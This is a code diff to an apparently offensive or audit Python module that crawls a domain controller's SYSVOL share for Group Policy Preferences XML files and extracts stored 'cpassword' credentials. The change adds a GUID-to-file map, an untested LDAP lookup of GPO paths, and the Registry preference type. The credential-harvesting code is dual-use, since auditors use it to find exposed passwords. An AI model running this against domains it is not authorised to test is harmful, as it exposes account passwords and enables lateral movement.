@@ -13,6 +13,19 @@ from smb.SMBConnection import SMBConnection
 from smb.smb_constants import *
 
 
+# refs
+#   1. https://glanfield.co.uk/make-group-policy-preferences-guid-again/
+#   2. https://blogs.technet.microsoft.com/mempson/2010/12/01/group-policy-client-side-extension-list/
+GP_CSE_GUIDS = {
+    '{5794DAFD-BE60-433f-88A2-1A31939AC01F}':'Drives.xml',
+    '{17D89FEC-5C44-4972-B12D-241CAEF74509}':'Groups.xml',
+    '{B087BE9D-ED37-454f-AF9C-04291E351182}':'Registry.xml',
+    '{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}':'ScheduledTasks.xml',
+    '{728EE579-943C-4519-9EF7-AB56765798ED}':'DataSources.xml',
+    '{91FBB303-0CD5-4055-BF42-E512A681B325}':'Services.xml',
+    '{BC75B1ED-5833-4858-9BB8-CBF0B166DF9D}':'Printers.xml'
+}
+
 '''
 References
 
@@ -74,7 +87,17 @@ def extract_cpassword(data, folder):
         creds.append({'user':user, 'pass':pw, 'changed':parents[p].get('changed')})
     return creds
 
-def handler(args, conn):
+def get_gpo_paths(conn):
+    ''' TODO test this. should replace recursive search for relevant .xml files in handler().
+    ref: https://glanfield.co.uk/make-group-policy-preferences-guid-again/ '''
+    paths = []
+    for g in GP_CSE_GUIDS.keys():
+        for r in conn.searchg(conn.default_search_base,
+                              '(gPCMachineExtensionNames=*{}*)'.format(g), attributes=['gPCFileSysPath']):
+            paths.append((r['attributes']['gPCFileSysPath'][0]))
+    return paths
+
+def handler(args, ldap_conn):
     ''' look for files sysvol\domain\policies\{GUID}\*\Preferences\*\*.xml containing "cpassword" '''
     dc_hostname = args.hostname or args.server
     if args.nthash:
@@ -83,13 +106,14 @@ def handler(args, conn):
                          domain=args.domain, is_direct_tcp=(args.smb_port != 139))
     conn.connect(args.server, port=args.smb_port)
     logger.debug('Connecting to \\\\{}\\sysvol'.format(args.server))
+    # TODO: for path in get_gpo_paths(ldap_conn):
     for p in list_sysvol(conn, args.domain+r'\Policies', SMB_FILE_ATTRIBUTE_DIRECTORY, '{*}'):
         if p.isDirectory:
             for mu in ['USER', 'MACHINE']:
                 pref = '\\'.join([args.domain, 'Policies', p.filename, mu, 'Preferences'])
                 logger.debug('PREF '+pref)
                 for t in list_sysvol(conn, pref, SMB_FILE_ATTRIBUTE_DIRECTORY):
-                    if t.filename.lower() in ['groups', 'drives', 'scheduledtasks', 'datasources', 'services', 'printers']:
+                    if t.filename.lower() in ['groups', 'drives', 'scheduledtasks', 'datasources', 'services', 'printers', 'registry']:
                         path = '\\'.join([pref, t.filename])
                         for x in list_sysvol(conn, path, 55, '*.xml'):
                             if x.file_size > 0:
